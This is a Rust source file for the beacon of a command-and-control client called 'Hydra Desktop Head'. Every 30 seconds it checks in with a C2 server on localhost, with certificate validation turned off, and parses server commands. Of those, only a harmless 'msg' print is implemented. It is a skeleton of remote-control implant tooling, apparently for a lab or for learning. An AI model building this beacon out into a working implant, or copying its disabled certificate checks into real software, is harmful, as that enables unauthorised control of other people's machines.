use reqwest::Client;
use std::time::Duration;
use tokio::time::sleep;
use serde_json::Value;

#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
    let client_id = "DESKTOP-HEAD-ALPHA";
    let server_url = "https://127.0.0.1:8443/checkin";

    let client = Client::builder()
        .danger_accept_invalid_certs(true)
        .use_rustls_tls()
        .build()?;

    println!("[+] Hydra Desktop Head Active. Connecting to C2...");

    loop {
        // Platform set to desktop so server knows which command to send
        let url = format!("{}/{}?platform=desktop", server_url, client_id);

        match client.post(&url).send().await {
            Ok(response) => {
                if response.status().is_success() {
                    let body: Value = response.json().await?;
                    println!("[*] C2 Response: {}", body);

                    // --- COMMAND PARSER ---
                    if let Some(command) = body.get("command") {
                        if !command.is_null() {
                            let action = command["action"].as_str().unwrap_or("");
                            println!("[!] Executing Command: {}", action);

                            if action == "msg" {
                                let content = command["content"].as_str().unwrap_or("No content");
                                println!(">> MESSAGE FROM HYDRA: {}", content);
                            }
                        }
                    }
                }
            }
            Err(e) => {
                eprintln!("[!] Connection failed: {}. Retrying...", e);
            }
        }

        sleep(Duration::from_secs(30)).await;
    }
}